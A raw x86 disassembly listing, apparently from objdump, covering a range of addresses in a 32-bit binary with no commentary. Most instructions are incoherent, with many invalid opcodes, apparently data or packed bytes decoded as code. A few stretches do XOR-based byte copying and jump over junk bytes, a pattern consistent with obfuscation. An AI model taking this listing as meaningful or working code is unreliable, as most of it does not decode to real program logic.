  408c3f:	int    0xb7
  408c41:	jmp    0x8ce5:0x13daaf6a
  408c48:	jp     0x408c6d
  408c4a:	loopne 0x408c92
  408c4c:	js     0x408c53
  408c4e:	mov    esi,0x903ab52f
  408c53:	sub    ch,BYTE PTR [ebp*8-0x38dcc1e4]
  408c5a:	sbb    al,0x1
  408c5c:	shrd   esi,ebp,0x5d
  408c60:	mul    DWORD PTR [edx]
  408c62:	sub    DWORD PTR [eax+0x2c],edi
  408c65:	pop    eax
  408c66:	mov    eax,ds:0x9e7c6d93
  408c6b:	inc    ecx
  408c6c:	(bad)  
  408c6d:	sar    DWORD PTR fs:[esi+0x61037543],0x86
  408c75:	sub    ch,dl
  408c77:	push   edi
  408c78:	stos   DWORD PTR es:[edi],eax
  408c79:	setb   BYTE PTR [ebx-0x37]
  408c7d:	pop    eax
  408c7e:	mov    ebp,0xc369f675
  408c83:	add    al,0xa5
  408c85:	ret    0xc100
  408c88:	xchg   ebp,eax
  408c89:	xor    eax,0x9b99dd2e
  408c8e:	push   edx
  408c8f:	retf   
  408c90:	jmp    0xae405ad6
  408c95:	xor    ah,BYTE PTR [edi+0x5283e8ca]
  408c9b:	adc    BYTE PTR [ecx+0x1f059bef],cl
  408ca1:	sub    eax,0xfc130ea
  408ca6:	cmc    
  408ca7:	xlat   BYTE PTR ds:[ebx]
  408ca8:	lahf   
  408ca9:	pusha  
  408caa:	pop    ss
  408cab:	fmul   DWORD PTR [ebx+0xc7fbd57]
  408cb1:	shl    esi,cl
  408cb3:	in     eax,0xad
  408cb5:	xor    esp,ebx
  408cb7:	es int 0x87
  408cba:	mov    dl,0x29
  408cbc:	cmc    
  408cbd:	scas   eax,DWORD PTR es:[edi]
  408cbe:	in     al,0x40
  408cc0:	int3   
  408cc1:	or     eax,0x966312c
  408cc6:	dec    esp
  408cc7:	adc    BYTE PTR [eax+0xb4307bc],dl
  408ccd:	sbb    ebp,ebx
  408ccf:	mov    DWORD PTR [edi+edx*4-0x7e],edx
  408cd3:	add    cl,cl
  408cd5:	loope  0x408c78
  408cd7:	out    dx,al
  408cd8:	mov    fs,ecx
  408cda:	das    
  408cdb:	das    
  408cdc:	mov    ebp,0xfd593699
  408ce1:	aas    
  408ce2:	aaa    
  408ce3:	push   ss
  408ce4:	mov    ah,0xf8
  408ce6:	mov    ds:0xc2663a99,eax
  408ceb:	ins    DWORD PTR es:[edi],dx
  408cec:	arpl   WORD PTR [ebx],sp
  408cee:	mov    ah,0x24
  408cf0:	arpl   WORD PTR [ecx+ecx*1-0x3f],bx
  408cf4:	xchg   DWORD PTR ds:0x2985348,esp
  408cfa:	adc    DWORD PTR [eax+ecx*1+0x17],ebp
  408cfe:	xor    edx,DWORD PTR [edi-0x5a75c53c]
  408d04:	or     DWORD PTR [edi+0x20],ebx
  408d07:	das    
  408d08:	das    
  408d09:	mov    edx,DWORD PTR ss:[ebp-0x450cb4b3]
  408d10:	mov    BYTE PTR [edx-0x2c],cl
  408d13:	pop    esi
  408d14:	mov    edi,0x5992e970
  408d19:	and    dl,BYTE PTR [esi+0x6dfa6a0]
  408d1f:	pop    esi
  408d20:	sub    ch,dh
  408d22:	leave  
  408d23:	not    BYTE PTR [eax+0x7f]
  408d26:	sub    esi,ecx
  408d28:	lds    ebx,FWORD PTR [edx+0x72a54cec]
  408d2e:	push   esi
  408d2f:	xor    DWORD PTR ds:0x2f797fe6,ecx
  408d35:	dec    edx
  408d36:	mov    WORD PTR [esp-0x499fd568],gs
  408d3d:	cld    
  408d3e:	mov    ebx,0x582608e9
  408d43:	push   eax
  408d44:	push   ecx
  408d45:	xchg   edi,eax
  408d46:	inc    edx
  408d47:	push   esp
  408d48:	pusha  
  408d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d4a:	repnz add al,0x8c
  408d4d:	jmp    0xea26:0xb02d3d83
  408d54:	int3   
  408d55:	jp     0x408cf0
  408d57:	(bad)  
  408d58:	(bad)  
  408d5a:	stos   DWORD PTR es:[edi],eax
  408d5b:	pop    ecx
  408d5c:	loop   0x408d9c
  408d5e:	xor    DWORD PTR [edx+0x61],edi
  408d61:	sar    BYTE PTR [ebx-0x4a],1
  408d64:	add    al,0x5c
  408d66:	push   ds
  408d67:	mov    al,ds:0xd8700168
  408d6c:	push   edi
  408d6d:	and    esp,DWORD PTR [ebx]
  408d6f:	rcl    DWORD PTR [edx+0x4b],0x5f
  408d73:	add    BYTE PTR [ebx+eiz*8],ah
  408d76:	fisttp WORD PTR [ebx]
  408d78:	test   BYTE PTR [edi-0x36c8c1be],bl
  408d7e:	and    al,0x27
  408d80:	mov    eax,ds:0x9b9430c8
  408d85:	dec    edi
  408d86:	cmp    DWORD PTR [ebx+0x28],eax
  408d89:	mov    WORD PTR [edi-0x1f],cs
  408d8c:	test   edx,ebx
  408d8e:	cmp    al,0xba
  408d90:	ficom  DWORD PTR [eax-0x32]
  408d93:	or     al,0x8b
  408d95:	push   ebp
  408d96:	hlt    
  408d97:	xor    edx,eax
  408d99:	add    edx,DWORD PTR [ebp-0x14]
  408d9c:	mov    edi,DWORD PTR [ebp-0x1c]
  408d9f:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408da6:	mov    BYTE PTR [ebp+0xb],dl
  408da9:	jmp    0x408fbd
  408dae:	bound  ebp,QWORD PTR [ebx-0xa]
  408db1:	popf   
  408db2:	cmc    
  408db3:	mov    eax,ds:0xc8827371
  408db8:	cdq    
  408db9:	ins    BYTE PTR es:[edi],dx
  408dba:	outs   dx,BYTE PTR ds:[esi]
  408dbb:	fld    QWORD PTR [ecx+0x70de932e]
  408dc1:	jo     0x408e2c
  408dc3:	jg     0x408e35
  408dc5:	jo     0x408dfe
  408dc7:	int    0xca
  408dc9:	inc    esp
  408dca:	sahf   
  408dcb:	jle    0x408e3c
  408dcd:	es jg  0x408d76
  408dd0:	or     al,0x45
  408dd2:	cmp    ah,BYTE PTR [edx-0x55]
  408dd5:	sub    ebx,ebx
  408dd7:	cmp    dl,BYTE PTR [edi+0x66344f24]
  408ddd:	outs   dx,BYTE PTR ds:[esi]
  408dde:	(bad)  
  408ddf:	sbb    cl,BYTE PTR [ebx+0x54]
  408de2:	scas   al,BYTE PTR es:[edi]
  408de3:	(bad)  
  408de4:	cmp    bh,BYTE PTR [ebp-0x48a11279]
  408dea:	and    BYTE PTR [ebx-0x3b],dh
  408ded:	int    0xe8
  408def:	push   cs
  408df0:	not    bh
  408df2:	cmc    
  408df3:	ror    eax,cl
  408df5:	aas    
  408df6:	mov    al,0x9f
  408df8:	jne    0x408e0e
  408dfa:	loope  0x408d96
  408dfc:	leave  
  408dfd:	dec    ebx
  408dfe:	mov    bh,0x27
  408e00:	inc    ebx
  408e01:	or     al,0x72
  408e03:	cmp    eax,0xafddef6d
  408e08:	and    ecx,eax
  408e0a:	ds mov esp,0xd8b0c4af
  408e10:	sbb    esi,DWORD PTR [esi-0x15552b6c]
  408e16:	xor    bh,ch
  408e18:	cdq    
  408e19:	ins    DWORD PTR es:[edi],dx
  408e1a:	sbb    dh,cl
  408e1c:	imul   esp,DWORD PTR ds:0x60166322,0x6dfd2e7c
  408e26:	dec    edi
  408e27:	or     DWORD PTR [ebx-0x65],ebx
  408e2a:	cdq    
  408e2b:	mov    ah,ch
  408e2d:	out    0xac,al
  408e2f:	or     dl,BYTE PTR [eax+eiz*1]
  408e32:	pop    eax
  408e33:	adc    eax,0x852208f1
  408e38:	popf   
  408e39:	push   ebp
  408e3a:	cmp    ecx,edx
  408e3c:	mov    dl,0xa7
  408e3f:	int    0x8a
  408e41:	push   ss
  408e42:	adc    esi,ebp
  408e44:	mov    ah,0x2
  408e46:	jp     0x408ec7
  408e48:	enter  0xb258,0x19
  408e4c:	out    0xce,eax
  408e4e:	lods   al,BYTE PTR ds:[esi]
  408e4f:	stos   BYTE PTR es:[edi],al
  408e50:	xor    DWORD PTR [edx],esi
  408e52:	(bad)  
  408e53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e54:	pop    ebp
  408e55:	xor    bh,bl
  408e57:	ss push ss
  408e59:	add    al,BYTE PTR [esi]
  408e5b:	inc    edi
  408e5c:	cmc    
  408e5d:	pop    ecx
  408e5e:	aas    
  408e5f:	loope  0x408e6c
  408e61:	mov    dl,0x7e
  408e63:	shr    BYTE PTR [edx],1
  408e65:	(bad)  
  408e66:	out    0x8b,al
  408e68:	xor    BYTE PTR [esi],ah
  408e6a:	mov    ebp,0x78d9862c
  408e6f:	xlat   BYTE PTR ds:[ebx]
  408e70:	fcomp  DWORD PTR [ecx]
  408e72:	cmp    eax,0xf10237e4
  408e77:	pop    edx
  408e78:	test   BYTE PTR [ebp+0x299340e7],ch
  408e7e:	dec    esi
  408e7f:	mov    ebx,0x89258f98
  408e84:	push   ss
  408e85:	dec    ebp
  408e86:	jmp    0xce89fc68
  408e8b:	sbb    eax,0xb6f3653e
  408e90:	mov    al,ds:0xf47fd6e8
  408e95:	clc    
  408e96:	pop    esp
  408e97:	outs   dx,BYTE PTR ds:[esi]
  408e98:	mov    ebx,0x3dc5c9db
  408e9d:	fwait
  408e9e:	es cwde 
  408ea0:	fwait
  408ea1:	jle    0x408e2f
  408ea3:	scas   al,BYTE PTR es:[edi]
  408ea4:	int    0x6f
  408ea6:	(bad)  
  408ea7:	retf   
  408ea8:	and    al,0xf2
  408eaa:	push   ebp
  408eab:	add    DWORD PTR [edi],ebp
  408ead:	imul   edx,DWORD PTR [edi+0x5e8a020f],0x1e
  408eb4:	xor    BYTE PTR [edi+esi*8-0xf],0xef
  408eb9:	inc    edx
  408eba:	add    bh,cl
  408ebc:	adc    ebx,DWORD PTR [esi+0x4]
  408ebf:	xchg   esi,eax
  408ec0:	call   0xa706:0x892f76b0
  408ec7:	je     0x408f18
  408ec9:	out    0xb,al
  408ecb:	popf   
  408ecc:	xor    BYTE PTR [edi+0x4],0x56
  408ed0:	test   eax,0x9baf544a
  408ed5:	stos   BYTE PTR es:[edi],al
  408ed6:	xchg   ebp,eax
  408ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ed8:	pusha  
  408ed9:	xor    eax,0x99c28a57
  408ede:	(bad)  
  408edf:	sbb    BYTE PTR [ebx],ch
  408ee1:	out    0x9f,eax
  408ee3:	std    
  408ee4:	or     dh,BYTE PTR [edx+0x59dbb3fe]
  408eea:	mov    esi,0xec9371bc
  408eef:	imul   edi,DWORD PTR ds:0x24eaea68,0x7d
  408ef6:	mov    al,0xdc
  408ef8:	push   ds
  408ef9:	xchg   ebp,eax
  408efa:	or     DWORD PTR [esi-0x646873a6],eax
  408f00:	cmp    BYTE PTR [ecx-0x350e2f9b],ch
  408f06:	mov    esi,DWORD PTR [eax]
  408f08:	pop    es
  408f09:	and    cl,BYTE PTR [edi-0xf7b48be]
  408f0f:	fimul  WORD PTR [edx+0xfe9fff0]
  408f15:	push   ds
  408f16:	push   0x61
  408f18:	popf   
  408f19:	inc    esp
  408f1a:	ss and eax,0x8ddf5eaf
  408f20:	sub    eax,0x70cc8d94
  408f25:	and    DWORD PTR [esi],eax
  408f27:	rcr    BYTE PTR [ebp+ebx*4+0x4585eb48],0x27
  408f2f:	sti    
  408f30:	jb     0x408f68
  408f32:	outs   dx,DWORD PTR ds:[esi]
  408f33:	sbb    dh,dh
  408f35:	repnz mov esp,0x2caca134
  408f3b:	add    bh,ch
  408f3d:	mov    WORD PTR [ebp+0xd],?
  408f40:	outs   dx,BYTE PTR ds:[esi]
  408f41:	xor    eax,DWORD PTR [edi+0x59]
  408f44:	sub    eax,0x2ecdf0c
  408f49:	inc    ebp
  408f4a:	ds mov esp,0xaaa6d99d
  408f50:	push   ss
  408f51:	enter  0x93ba,0x12
  408f55:	cmp    al,0x28
  408f57:	mov    al,0x3
  408f59:	inc    ebx
  408f5a:	(bad)  
  408f5b:	cld    
  408f5c:	dec    esi
  408f5d:	cmp    BYTE PTR [bp+si-0x364e],bh
  408f62:	into   
  408f63:	call   0xb62d229f
  408f68:	inc    ecx
  408f69:	adc    BYTE PTR ds:[eax+0x3b],0x4e
  408f6e:	xor    bh,dh
  408f70:	xchg   esp,eax
  408f71:	cmp    al,0x75
  408f73:	push   ebx
  408f74:	sbb    al,0xe1
  408f76:	dec    ecx
  408f77:	leave  
  408f78:	jmp    0xc65e97d4
  408f7d:	ret    0x2e88
  408f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f81:	xchg   edx,eax
  408f82:	add    esp,edi
  408f84:	neg    DWORD PTR [ebp-0x50cb34dd]
  408f8a:	mov    bh,BYTE PTR [edi]
  408f8c:	and    eax,0xb21d070d
  408f91:	jo     0x408fa9
  408f93:	and    BYTE PTR [ebp+0x2c],ch
  408f96:	dec    edx
  408f97:	outs   dx,DWORD PTR ds:[esi]
  408f98:	add    DWORD PTR [edi],0x28e95151
  408f9e:	loope  0x408f54
  408fa0:	and    ebp,esi
  408fa2:	cld    
  408fa3:	mov    bl,0xed
  408fa5:	mov    ebp,0xfab52a97
  408faa:	pop    ds
  408fab:	xor    eax,0x23c6db74
  408fb0:	push   ebp
  408fb1:	hlt    
  408fb2:	xchg   ebp,eax
  408fb3:	mov    ecx,0xc47ae317
  408fb8:	fistp  WORD PTR [esi-0x75307383]
  408fbe:	push   ebp
  408fbf:	jnp    0xf8748442
  408fc5:	add    edi,DWORD PTR [ebp-0x14]
  408fc8:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fcb:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fd2:	mov    dl,BYTE PTR [ebp+0xb]
  408fd5:	mov    edi,DWORD PTR [ebp-0x18]
  408fd8:	xor    edi,eax
  408fda:	add    edi,DWORD PTR [ebp-0x14]
  408fdd:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fe0:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fe7:	mov    edx,DWORD PTR [ebp-0x44]
  408fea:	mov    edi,DWORD PTR [ebp-0xc]
  408fed:	xor    edx,eax
  408fef:	xor    edi,eax
  408ff1:	add    edx,ecx
  408ff3:	jmp    0x409207
  408ff8:	or     ah,bh
  408ffa:	das    
  408ffb:	mov    ?,ecx
  408ffd:	push   esi
  408ffe:	test   eax,0xbb5c4a63
  409003:	into   
  409004:	ins    DWORD PTR es:[edi],dx
  409005:	and    al,BYTE PTR [edi+0x27]
  409008:	mov    esp,ds
  40900a:	jo     0x40907c
  40900c:	imul   edi,DWORD PTR [edi+0x70],0xeaa95470
  409013:	cmp    eax,0x7fad61ef
  409018:	mov    eax,0x468e0db2
  40901d:	inc    eax
  40901e:	jo     0x408fda
  409020:	mov    esp,0xe76f905
  409025:	stos   DWORD PTR es:[edi],eax
  409026:	jmp    0xb809:0x9dd5d827
  40902d:	mov    ch,dh
  40902f:	push   esi
  409031:	or     cl,BYTE PTR [ecx-0xa]
  409034:	arpl   WORD PTR [ecx+0x41],bp
  409037:	call   0xb5c12c7
  40903c:	jnp    0x409028
  40903e:	sub    dl,ch
  409040:	std    
  409041:	aaa    
  409042:	(bad)  
  409043:	test   al,0x6
  409045:	das    
  409046:	and    BYTE PTR [ecx-0x4d],0xe5
  40904a:	push   eax
  40904b:	(bad)  
  40904c:	clc    
  40904d:	cdq    
  40904e:	push   esp
  40904f:	ja     0x409074
  409051:	dec    edx
  409052:	(bad)  
  409053:	cmp    BYTE PTR [esi-0x7d483992],al
  409059:	aam    0x42
  40905b:	mov    eax,0x6f31f772
  409060:	push   edi
  409061:	lar    esi,WORD PTR [edi+0x5095e1a7]
  409068:	or     esi,DWORD PTR [edi]
  40906a:	pop    edi
  40906b:	add    DWORD PTR [ebx+0x1d],ebx
  40906e:	inc    eax
  40906f:	push   edx
  409070:	call   0x253265c2
  409075:	int3   
  409076:	add    edx,DWORD PTR [edx-0x2]
  409079:	xchg   eax,ebx
  40907b:	bound  eax,QWORD PTR [esi-0x3b4212bf]
  409081:	sub    edx,esp
  409083:	jns    0x409076
  409085:	jecxz  0x40902e
  409087:	lahf   
  409088:	push   edx
  409089:	adc    BYTE PTR [esi-0x4a],dl
  40908c:	(bad)  
  40908d:	rcl    cl,cl
  40908f:	mov    al,ds:0x2dece994
  409094:	pusha  
  409095:	jnp    0x40909d
  409097:	pop    ss
  409098:	stos   DWORD PTR es:[edi],eax
  409099:	push   edx
  40909a:	call   0xfee5:0x7febbc9c
  4090a1:	dec    eax
  4090a2:	mov    WORD PTR [esi],gs
  4090a4:	pusha  
  4090a5:	mov    edi,DWORD PTR [esi+0x2cad4628]
  4090ab:	adc    al,0x2f
  4090ad:	das    
  4090ae:	mov    al,ds:0x184b3e8e
  4090b3:	mov    dl,0x63
  4090b5:	and    DWORD PTR [edi+eax*8+0x24],edx
  4090b9:	cdq    
  4090ba:	mov    ebx,0xcb10c029
  4090bf:	addr16 pushf 
  4090c1:	and    BYTE PTR [edi+0x24],bl
  4090c4:	adc    ebp,edx
  4090c6:	pop    es
  4090c7:	pusha  
  4090c8:	dec    esi
  4090c9:	cmp    DWORD PTR [edx],eax
  4090cb:	jmp    0x4090b7
  4090cd:	pop    ds
  4090ce:	scas   eax,DWORD PTR es:[edi]
  4090cf:	and    al,0xcb
  4090d1:	or     DWORD PTR [eax+ebp*1+0x74d52031],0xffffff9a
  4090d9:	adc    al,0x7d
  4090db:	enter  0xa3b8,0xbc
  4090df:	cmc    
  4090e0:	adc    al,0xe6
  4090e2:	mov    ah,0x91
  4090e4:	jo     0x4090d0
  4090e6:	test   al,0xb7
  4090e8:	jecxz  0x409127
  4090ea:	push   ebp
  4090eb:	popa   
  4090ec:	cmp    eax,0xb038cd6a
  4090f1:	pop    esi
  4090f2:	jb     0x409088
  4090f4:	repnz adc esp,DWORD PTR [edi-0x80]
  4090f8:	pop    ds
  4090f9:	xchg   BYTE PTR [ebx+ecx*1-0x6a],bh
  4090fd:	fiadd  WORD PTR [ebp-0x28]
  409100:	sub    eax,0xd44a649b
  409105:	mov    al,ds:0x132a1d02
  40910a:	jno    0x409115
  40910c:	int3   
  40910d:	pop    eax
  40910e:	out    dx,al
  40910f:	clc    
  409110:	pop    ds
  409111:	inc    edx
  409112:	add    eax,0x6804af69
  409117:	adc    DWORD PTR [esi-0x9952ee8],esp
  40911d:	fidivr DWORD PTR [ecx]
  40911f:	mov    dl,0x61
  409121:	cmp    DWORD PTR [esi-0x73],eax
  409124:	fdivrp st(0),st
  409126:	dec    edx
  409127:	xor    cl,BYTE PTR ds:0x63035d25
  40912d:	pop    ecx
  40912e:	mov    ch,0x75
  409130:	jp     0x4090ef
  409132:	mov    dl,0x6d
  409134:	cmp    al,0xfd
  409136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409137:	rol    BYTE PTR [esi-0x805e39d],cl
  40913d:	lahf   
  40913e:	je     0x4090f5
  409140:	adc    DWORD PTR [ecx+0x110afc2d],0x64754792
  40914a:	sbb    cl,BYTE PTR [ecx-0x7a2a26bd]
  409150:	xchg   esi,eax
  409151:	mov    ebx,0x919d57b0
  409156:	xrelease mov BYTE PTR [ebx+0x657d2c61],0x73
  40915e:	je     0x409103
  409160:	loopne 0x409191
  409162:	sub    BYTE PTR [eax-0x31],bl
  409165:	pop    esp
  409166:	shl    DWORD PTR [esi+0x5c8c342f],1
  40916c:	sbb    BYTE PTR [edi-0x6],al
  40916f:	xchg   esi,eax
  409170:	or     DWORD PTR [eax],0x7
  409173:	or     DWORD PTR [edi],ebx
  409175:	arpl   bx,ax
  409177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409178:	sub    ebp,esp
  40917a:	adc    DWORD PTR [esi],0x28482dc2
  409180:	call   0xaccb:0x2b2a8cc7
  409187:	sub    DWORD PTR [esi+0x4],0xffffffdf
  40918b:	xchg   BYTE PTR [esi+0x23f08edf],ch
  409191:	fsub   QWORD PTR [ecx-0x2bec9bd1]
  409197:	jge    0x4091c6
  409199:	test   eax,0x7faae869
  40919e:	arpl   WORD PTR [ecx],dx
  4091a0:	fst    QWORD PTR [edi+0x478a58df]
  4091a6:	mov    cl,0xfb
  4091a8:	out    dx,al
  4091a9:	mov    DWORD PTR [edi*8-0x782b1f51],esi
  4091b0:	cmp    BYTE PTR [esi-0x3b040d83],ch
  4091b6:	dec    edx
  4091b7:	stc    
  4091b8:	mov    ch,0xb6
  4091ba:	pop    ss
  4091bb:	jle    0x4091b2
  4091bd:	arpl   WORD PTR [eax+0x28],cx
  4091c0:	pop    esp
  4091c1:	sub    ah,ah
  4091c3:	adc    BYTE PTR [ebx],0xa6
  4091c6:	mov    BYTE PTR [edi-0x7d],dh
  4091c9:	inc    ebp
  4091ca:	lea    esp,[eax*1+0x1751088c]
  4091d1:	lds    eax,FWORD PTR [edi-0x3873052d]
  4091d7:	xor    bh,BYTE PTR [esi-0x467531a6]
  4091dd:	dec    ebp
  4091de:	sbb    esp,DWORD PTR [eax]
  4091e0:	(bad)  
  4091e1:	xchg   esp,eax
  4091e2:	aaa    
  4091e3:	adc    BYTE PTR [ebp+ecx*2+0x826affa],cl
  4091ea:	ret    
  4091eb:	idiv   ebp
  4091ed:	loope  0x409261
  4091ef:	gs inc ebp
  4091f1:	leave  
  4091f2:	call   0x5536220e
  4091f7:	js     0x4091a5
  4091f9:	adc    BYTE PTR [eax],0x9d
  4091fc:	mov    dh,0xca
  4091fe:	call   0x305ac16b
  409203:	in     al,0x4f
  409205:	fisttp WORD PTR [ecx+0xfe9f903]
  40920b:	add    al,BYTE PTR [eax]
  40920d:	add    BYTE PTR [edx+0x32072a9a],al
  409213:	xchg   edi,eax
  409214:	mov    cl,0x99
  409216:	js     0x4091b8
  409218:	mov    ah,0x66
  40921a:	cmp    ecx,DWORD PTR [ecx-0x257a1032]
  409220:	jo     0x409292
  409222:	imul   edi,DWORD PTR [edi+0x70],0x4ce41270
  409229:	mov    esi,0x8ff38709
  40922e:	out    dx,eax
  40922f:	sbb    bh,cl
  409231:	divps  xmm6,xmm0
  409234:	xor    eax,DWORD PTR [edx-0x56f19b82]
  40923a:	ret    0x73bc
  40923d:	sbb    BYTE PTR [esp+ebx*2],0xd8
  409241:	adc    al,0x59
  409243:	repz rcl BYTE PTR [esi],1
  409246:	dec    eax
  409247:	push   esi
  409248:	mov    edx,0x55c606b5
  40924d:	test   eax,0xe0bc9973
  409252:	and    ebx,esi
  409254:	add    ah,bh
  409256:	sub    BYTE PTR ds:0xf1faf026,bl
  40925c:	out    dx,al
  40925d:	and    eax,0x5268234e
  409262:	push   ebx
  409263:	sbb    DWORD PTR [edx+ebp*4],ebx
  409266:	sti    
  409267:	mov    ds:0xe8a5ddfc,eax
  40926c:	popa   
  40926d:	fwait
  40926e:	retf   0x782
  409271:	or     dl,BYTE PTR [eax-0x55]
  409274:	jp     0x4092a7
  409276:	dec    esi
  409277:	pop    ebp
  409278:	sahf   
  409279:	pop    esp
  40927a:	add    eax,0x3d
  40927d:	mov    bh,0x88
  40927f:	sahf   
  409280:	xchg   BYTE PTR [edi-0x38ba8907],dh
  409286:	and    DWORD PTR [esi-0x47873657],esi
  40928c:	in     al,dx
  40928d:	xor    al,0xcc
  40928f:	push   ecx
  409290:	bnd jae 0x409273
  409293:	and    BYTE PTR [ebp+0xc5ac8c8],0xdb
  40929a:	out    0x2c,eax
  40929c:	push   esi
  40929d:	out    dx,eax
  40929e:	mov    bx,0x7ad8
  4092a2:	icebp  
  4092a3:	cwde   
  4092a4:	shl    DWORD PTR [edi+0x31],1
  4092a7:	shr    DWORD PTR ds:0x1ccdf7a3,1
  4092ad:	mov    eax,ds:0x3a4dbbca
  4092b2:	mov    dl,bh
  4092b4:	xchg   edi,eax
  4092b5:	or     edx,DWORD PTR [edx+0x443d7ac2]
  4092bb:	je     0x40925b
  4092bd:	rcr    BYTE PTR [edx-0x3f32e100],cl
  4092c3:	push   cs
  4092c4:	stc    
  4092c5:	(bad)  
  4092c6:	outs   dx,DWORD PTR ds:[esi]
  4092c7:	sbb    al,0xc5
  4092c9:	sub    DWORD PTR [esi+0x2ef4b6a6],edx
  4092cf:	aas    
  4092d0:	les    ebp,FWORD PTR [ebp+0x5f1c5290]
  4092d6:	js     0x409261
  4092d8:	cwde   
  4092d9:	aad    0x4f
  4092db:	lods   al,BYTE PTR ds:[esi]
  4092dc:	cmp    edx,DWORD PTR [esi-0x69]
  4092df:	retf   
  4092e0:	mov    dl,0x20
  4092e2:	mov    ch,0xcc
  4092e4:	div    DWORD PTR [ebp+0x2e1816ea]
  4092ea:	lock or bh,dl
  4092ed:	jb     0x409289
  4092ef:	jae    0x4092fb
  4092f1:	icebp  
  4092f2:	inc    eax
  4092f3:	aaa    
  4092f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092f5:	mov    ah,0xb6
  4092f7:	sti    
  4092f8:	in     eax,dx
  4092f9:	jl     0x4092a9
  4092fb:	xor    al,0x9
  4092fd:	adc    al,0x74
  4092ff:	cmp    eax,0x8a321ef7
  409304:	sbb    al,0x8c
  409306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409307:	add    eax,DWORD PTR [esi]
  409309:	cmp    al,0x96
  40930b:	scas   eax,DWORD PTR es:[edi]
  40930c:	imul   esp,DWORD PTR [edx+edi*2+0xf],0x37
  409311:	outs   dx,DWORD PTR ds:[esi]
  409312:	add    al,0x2b
  409314:	dec    eax
  409315:	cli    
  409316:	sbb    cl,BYTE PTR [ebx-0x5c]
  409319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40931a:	jae    0x4092d4
  40931c:	into   
  40931d:	cmp    BYTE PTR [esi-0x3e],0x95
  409321:	adc    eax,0x3b52d29e
  409326:	xor    dh,BYTE PTR [edi]
  409328:	jnp    0x40937d
  40932a:	cmp    eax,0xba4db738
  40932f:	pop    ebp
  409330:	push   esp
  409331:	jb     0x409316
  409333:	inc    esp
  409334:	in     eax,0x9b
  409336:	loop   0x4092c9
  409338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409339:	cmc    
  40933a:	jmp    0xa1fd:0x1c75ac99
  409341:	xor    edx,DWORD PTR [ebx-0x4a]
  409344:	mov    bh,0x4c
  409346:	add    al,0x63
  409348:	ins    DWORD PTR es:[edi],dx
  409349:	mov    ch,0xf2
  40934b:	into   
  40934c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40934d:	and    eax,0x234a7be4
  409352:	loop   0x40931a
  409354:	and    ebp,0x4d
  409357:	jno    0x409396
  409359:	cli    
  40935a:	mov    ch,0x4c
  40935c:	ins    DWORD PTR es:[edi],dx
  40935d:	mov    esi,0xd8e8e657
  409362:	xor    eax,0x8ac35a50
  409367:	test   BYTE PTR [esi],0xf7
  40936a:	mov    cl,0x83
  40936c:	aam    0x40
  40936e:	xchg   BYTE PTR [edx],ch
  409370:	out    0xf,al
  409372:	dec    eax
  409373:	pop    es
  409374:	xor    al,0x19
  409376:	or     al,BYTE PTR [ecx-0x2b56822c]
  40937c:	add    eax,0x7ad252cb
  409381:	sub    BYTE PTR [edi],bh
  409383:	(bad)  
  409384:	mov    fs,WORD PTR [ecx+ecx*2+0x40]
  409388:	add    eax,0x9f617379
  40938d:	test   ebp,edi
  40938f:	cmp    ebx,DWORD PTR [ebx-0x4d]
  409392:	sbb    eax,DWORD PTR [esi-0x39]
  409395:	jmp    0x4b59:0x74de00be
  40939c:	std    
  40939d:	js     0x409388
  40939f:	(bad)  
  4093a0:	adc    al,0x4
  4093a2:	mov    eax,ds:0x3b4eae81
  4093a7:	f2xm1  
  4093a9:	fs sub al,0x71
  4093ac:	ret    0x83b0
  4093af:	popa   
  4093b0:	cld    
  4093b1:	sub    BYTE PTR [ebx+0x63],cl
  4093b4:	out    dx,al
  4093b5:	jne    0x409432
  4093b7:	lods   eax,DWORD PTR ds:[esi]
  4093b8:	mov    bl,0x5f
  4093ba:	pmaxub mm2,QWORD PTR [edx-0x1b]
  4093be:	push   cs
  4093bf:	push   cs
  4093c0:	ins    DWORD PTR es:[edi],dx
  4093c1:	or     dh,BYTE PTR [ebp+0x1b]
  4093c4:	sub    ch,BYTE PTR ds:0xcc84f2af
  4093ca:	lock and al,0xad
  4093cd:	jns    0x40943f
  4093cf:	adc    ebx,DWORD PTR [eax-0x26]
  4093d2:	inc    ebp
  4093d3:	adc    bl,BYTE PTR [edi-0x33ba32e3]
  4093d9:	iret   
  4093da:	dec    ebx
  4093db:	inc    ecx
  4093dc:	loop   0x4093ff
  4093de:	retf   
  4093df:	mov    DWORD PTR es:[edi+ebp*8-0x776d9b85],esp
  4093e7:	inc    ebx
  4093e8:	mov    esp,0x22b9ed5e
  4093ed:	stos   DWORD PTR es:[edi],eax
  4093ee:	sbb    DWORD PTR es:[edi+0x37d983da],ecx
  4093f5:	js     0x40940b
  4093f7:	out    dx,al
  4093f8:	sti    
  4093f9:	dec    edi
  4093fa:	stc    
  4093fb:	mov    eax,0x12e08eb2
  409401:	adc    eax,edi
  409403:	jo     0x40946a
  409405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409406:	xor    eax,0x4bceccca
  40940b:	and    BYTE PTR [ecx-0x54],dh
  40940e:	push   ebx
  40940f:	ja     0x4093a1
  409411:	mov    cl,0x29
  409413:	ds hlt 
  409415:	dec    eax
  409416:	jle    0x40940a
  409418:	retf   
  409419:	shl    ah,1
  40941b:	add    BYTE PTR [esi-0x162850f1],0xf
  409422:	add    al,BYTE PTR [eax]
  409424:	add    al,bh
  409426:	icebp  
  409427:	mov    esp,0xb8b16984
  40942c:	icebp  
  40942d:	ficomp DWORD PTR [edx-0x3606e013]
  409433:	adc    ch,BYTE PTR [ebx]
  409435:	(bad)  
  409436:	fdiv   DWORD PTR [eax+0x70]
